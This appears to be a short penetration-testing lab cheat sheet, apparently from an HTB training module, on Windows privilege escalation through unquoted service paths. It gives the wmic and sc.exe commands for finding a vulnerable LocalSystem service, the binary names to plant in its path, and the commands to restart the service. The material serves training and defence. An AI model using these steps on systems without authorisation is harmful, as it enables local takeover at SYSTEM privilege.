# Unquoted Service Paths

## Searching for Unquoted Service BINARY_PATH_NAME

```pwsh
PS C:\Users\htb-student> wmic SERVICE GET Name,PathName,StartMode | findstr /I /C:Auto | findstr /IV /C:C:\Windows | findstr /V /C:\`"
```

```output title="Output"
GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
```

## SystemExplorerHelpService Query Configuration

```pwsh
PS C:\Users\htb-student> sc.exe qc SystemExplorerHelpService
```

```output title="Output" hl_lines="7"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

## Execution Method

1. C:\Program
2. C:\Program Files
3. C:\Program Files (x86)\System
4. C:\Program Files (x86)\System Explorer\service\SystemExplorerService64

## Abusing Execution Method

* C:\Program.exe
* C:\Program Files (x86)\System.exe

## Triggering (Program.exe/System.exe)

### SystemExplorerHelpService Stop

```pwsh
PS C:\Users\htb-student> sc.exe stop SystemExplorerHelpService
```

### SystemExplorerHelpService Start

```pwsh
PS C:\Users\htb-student> sc.exe start SystemExplorerHelpService
```
